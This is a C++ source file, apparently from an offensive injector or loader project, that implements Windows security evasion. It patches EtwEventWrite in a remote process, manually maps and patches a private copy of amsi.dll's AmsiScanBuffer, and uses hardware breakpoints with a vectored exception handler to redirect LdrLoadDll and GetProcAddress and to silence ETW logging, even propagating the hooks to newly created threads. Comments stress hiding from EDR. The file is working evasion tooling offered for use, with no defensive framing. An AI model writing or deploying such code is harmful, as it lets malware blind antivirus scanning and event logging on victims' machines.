#include "patch.hpp"


std::vector<BYTE> ReadFileToBuffer(const std::string& filename) {
    std::ifstream file(filename, std::ios::binary | std::ios::ate);
    if (!file) {
        throw std::runtime_error("Failed to open file");
    }

    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);

    std::vector<BYTE> buffer(size);
    file.read(reinterpret_cast<char*>(buffer.data()), size);

    return buffer;
}
bool patchRemoteETW(HANDLE hProcess) {
    // 1. Get address of EtwEventWrite from local ntdll (it will be the same in remote)
    // You can use your syscallHandler or GetProcAddress since ntdll is already loaded
    unsigned char* k = helperHandler.getNtdll();
   
    wchar_t wK[50];
    size_t convertedChars = 0;

    mbstowcs_s(&convertedChars, wK, 50, (char*)k, _TRUNCATE);
    PVOID etwAddress = syscallHandler.getFunctionAddressByHash(wK, 615043106);

    if (!etwAddress) return 1;

    unsigned char patch[] = { 0x31, 0xC0, 0xC3 }; // xor eax, eax; ret
    SIZE_T patchSize = sizeof(patch);

    std::cout << "[!] Patching ETW at: " << etwAddress << std::endl;

    // 2. Change protection to RW
    mainInjector.protectMemFlag(hProcess, etwAddress, PAGE_READWRITE, patchSize);

    // 3. Write the patch
    mainInjector.wrMem(hProcess, etwAddress, (LPVOID)patch, patchSize);

    // 4. Restore protection to RX
    mainInjector.protectMemFlag(hProcess, etwAddress, PAGE_EXECUTE_READ, patchSize);

    std::cout << "[+] ETW silenced in remote process." << std::endl;
    return 0;
}

std::vector<DWORD> patchedThreads;
PVOID g_EtwAddr;



PVOID g_AmsiAddr;
typedef NTSTATUS(NTAPI* f_LdrLoadDll)(PWSTR, PULONG, PUNICODE_STRING, PVOID*);
f_LdrLoadDll oLdrLoadDll = nullptr;
PVOID g_pGetProcAddress = nullptr;
HMODULE g_ManualAmsi = nullptr;
PVOID g_pLdrLoadDll = nullptr;








bool FullAmsiBypass() {
    // 1. Manually map amsi.dll into our process
    // This copy is invisible to the OS/EDR because it's not in the PEB
    std::vector<unsigned char> buff = ReadFileToBuffer("C:\\Windows\\System32\\amsi.dll");
    std::cout << "amsi.dll size: " << buff.size() << "\n";
    g_ManualAmsi = (HMODULE)LocalManualMap(buff.data());
    if(g_ManualAmsi == NULL) {
        std::cout << "Failed to manually map amsi.dll\n";
        return false;
	}
	std::cout << "Locally mapped amsi.dll at: " << g_ManualAmsi << "\n";
    // 2. Patch our private copy's AmsiScanBuffer
    // This is safe because it's just a random allocation, not the 'real' module yet
    
    PVOID localAmsiScanBuffer = syscallHandler.getFunctionAddressByHashWithModule(g_ManualAmsi, 704434574);
    if(localAmsiScanBuffer == NULL) {
        std::cout << "Failed to find AmsiScanBuffer in manual map\n";
        return false;
	}
	std::cout << "AmsiScanBuffer address in local copy: " << localAmsiScanBuffer << "\n";
    unsigned char patch[] = { 0x31, 0xC0, 0xC3 }; // xor eax, eax; ret

    DWORD old;
    mainInjector.protectMemFlag(HANDLE(-1), localAmsiScanBuffer, PAGE_READWRITE, sizeof(patch));
    memcpy(localAmsiScanBuffer, patch, sizeof(patch));
    mainInjector.protectMemFlag(HANDLE(-1), localAmsiScanBuffer, PAGE_EXECUTE_READ, sizeof(patch));

    BYTE* emptyBuffer = (BYTE*)malloc(1024 * 1024 * 20);

    memset(emptyBuffer, 0, 1024 * 1024 * 20);
    if (!WriteProcessMemory(HANDLE(-1), g_ManualAmsi, emptyBuffer, 0x1000, nullptr)) {
        std::cout << "WARNING!: Can't clear HEADER\n";
    }
    // 3. Set Hardware Breakpoint on LdrLoadDll
    g_pLdrLoadDll = syscallHandler.getFunctionAddressByHash(L"ntdll.dll", 50846499);
    g_pGetProcAddress = syscallHandler.getFunctionAddressByHash(L"kernel32.dll", 3476142879);
    if (g_pGetProcAddress == NULL || g_pLdrLoadDll == NULL) {
        std::cout << "Failed to get address for LdrLoadDll or GetProcAddress\n";
        return false;
    }
	std::cout << "LdrLoadDll address: " << g_pLdrLoadDll << "\n";
	std::cout << "GetProcAddress address: " << g_pGetProcAddress << "\n";
    AddVectoredExceptionHandler(1, UniversalHwbpHandler);

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    apcInjector.myThreadContext(GetCurrentThread(), &ctx);

    // Dr0 for the Loader
    ctx.Dr0 = (DWORD64)g_pLdrLoadDll;
    ctx.Dr7 |= (1 << 0);

    // Dr1 for GetProcAddress
    ctx.Dr1 = (DWORD64)g_pGetProcAddress;
    ctx.Dr7 |= (1 << 2); // Enable Dr1

    ctx.Dr7 &= ~(3 << 16); // Break on Execution for Dr0
    ctx.Dr7 &= ~(3 << 20); // Break on Execution for Dr1
    apcInjector.myNtSetContextThread(GetCurrentThread(), &ctx);
    //SetThreadContext(GetCurrentThread(), &ctx);

    std::cout << "[+] Stealth AMSI Redirect Active. ntdll bytes remain untouched.\n";
    
    return true;
}

HMODULE g_ManualNtdll = nullptr;
PVOID g_pNtCreateThreadEx = nullptr;
PVOID g_pEtwEventWrite = nullptr;
PVOID g_pPendingThreadHandleAddr = nullptr;

LONG WINAPI UniversalHwbpHandler(PEXCEPTION_POINTERS exceptions) {
    if (exceptions->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        PCONTEXT ctx = exceptions->ContextRecord;

        // --- 1. AMSI REDIRECTION (LdrLoadDll) ---
        if (exceptions->ExceptionRecord->ExceptionAddress == g_pLdrLoadDll) {
            PUNICODE_STRING pDllName = (PUNICODE_STRING)ctx->R8; // x64 calling convention
            if (pDllName && pDllName->Buffer && wcsstr(pDllName->Buffer, L"amsi.dll")) {
                // Redirect output handle to our manually mapped AMSI
                *(PVOID*)ctx->R9 = (PVOID)g_ManualAmsi;

                ctx->Rax = 0; // STATUS_SUCCESS
                ctx->Rip = *(DWORD64*)(ctx->Rsp); // Pop RIP from stack
                ctx->Rsp += 8;                    // Fix stack pointer

                ctx->EFlags |= 0x10000; // Set RF
                return EXCEPTION_CONTINUE_EXECUTION;
            }
        }

        // --- 2. AMSI REDIRECTION (GetProcAddress) ---
        if (exceptions->ExceptionRecord->ExceptionAddress == g_pGetProcAddress) {
            HMODULE hMod = (HMODULE)ctx->Rcx;
            if (hMod == g_ManualAmsi) {
                // Point every request to this module to our patched AmsiScanBuffer
                PVOID targetFunc = syscallHandler.getFunctionAddressByHashWithModule(g_ManualAmsi, 704434574);
                ctx->Rax = (DWORD64)targetFunc;
                ctx->Rip = *(DWORD64*)(ctx->Rsp);
                ctx->Rsp += 8;

                ctx->EFlags |= 0x10000;
                return EXCEPTION_CONTINUE_EXECUTION;
            }
        }

        // --- 3. ETW PERSISTENCE (NtCreateThreadEx) ---
        if (exceptions->ExceptionRecord->ExceptionAddress == g_pNtCreateThreadEx) {
            // Note: RCX points to the PHANDLE for the new thread. 
            // Since this is a HWBP on the START of the function, the handle isn't populated yet.
            // We save the address where the handle WILL be stored.
            g_pPendingThreadHandleAddr = (PVOID)ctx->Rcx;

            // We want to apply breakpoints to the new thread. 
            // We use a 'Single Step' trap to catch the instruction immediately after this returns.
            ctx->EFlags |= 0x100; // Set Trap Flag (TF) to trigger next instruction
        }

        // --- 4. ETW SILENCING (EtwEventWrite) ---
        if (exceptions->ExceptionRecord->ExceptionAddress == g_pEtwEventWrite) {
            ctx->Rax = 0; // Success
            ctx->Rip = *(DWORD64*)(ctx->Rsp);
            ctx->Rsp += 8;

            ctx->EFlags |= 0x10000;
            return EXCEPTION_CONTINUE_EXECUTION;
        }

        // --- 5. POST-THREAD CREATION LOGIC (Trap Flag Trigger) ---
        // If we hit a step and we have a pending handle address, it means NtCreateThreadEx just finished
        if (g_pPendingThreadHandleAddr != nullptr) {
            HANDLE hNewThread = *(PHANDLE)g_pPendingThreadHandleAddr;
            if (hNewThread) {
                CONTEXT childCtx = { 0 };
                childCtx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

                // Copy current thread's debug setup to the child
                childCtx.Dr0 = ctx->Dr0;
                childCtx.Dr1 = ctx->Dr1;
                childCtx.Dr2 = ctx->Dr2;
                childCtx.Dr3 = ctx->Dr3;
                childCtx.Dr7 = ctx->Dr7;

                // Apply to the newly spawned thread
                apcInjector.myNtSetContextThread(hNewThread, &childCtx);
            }
            g_pPendingThreadHandleAddr = nullptr; // Reset
        }

        ctx->EFlags |= 0x10000; // Always set RF to avoid infinite loop
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

bool FullEtwBypass() {
    unsigned char* k = helperHandler.getNtdll();
    
    wchar_t wK[50];
    size_t convertedChars = 0;

    mbstowcs_s(&convertedChars, wK, 50, (char*)k, _TRUNCATE);
    // 1. Get targets (Ideally use your syscallHandler to get these from your manual map)
    g_pNtCreateThreadEx = syscallHandler.getFunctionAddressByHash(wK, 3406569776);
    g_pEtwEventWrite = syscallHandler.getFunctionAddressByHash(wK, 615043106);

    if (!g_pNtCreateThreadEx || !g_pEtwEventWrite) return false;

    // current context for dr0 and dr1
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    apcInjector.myThreadContext(GetCurrentThread(), &ctx);

    // ETW hooks on dr2 and Dr3
    ctx.Dr2 = (DWORD64)g_pNtCreateThreadEx;
    ctx.Dr7 |= (1 << 4); // Enable Dr2 (L2 local)

    ctx.Dr3 = (DWORD64)g_pEtwEventWrite;
    ctx.Dr7 |= (1 << 6); // Enable Dr3 (L3 local)

    // Ensure they break on EXECUTION (00 in bits 24-31 for Dr2/Dr3)
    ctx.Dr7 &= ~(3 << 24); // Dr2 condition = Execute
    ctx.Dr7 &= ~(3 << 28); // Dr3 condition = Execute

    // 4. Apply to current thread
    apcInjector.myNtSetContextThread(GetCurrentThread(), &ctx);

    std::cout << "[+] ETW Persistence Active on Dr2/Dr3\n";
    return true;
}



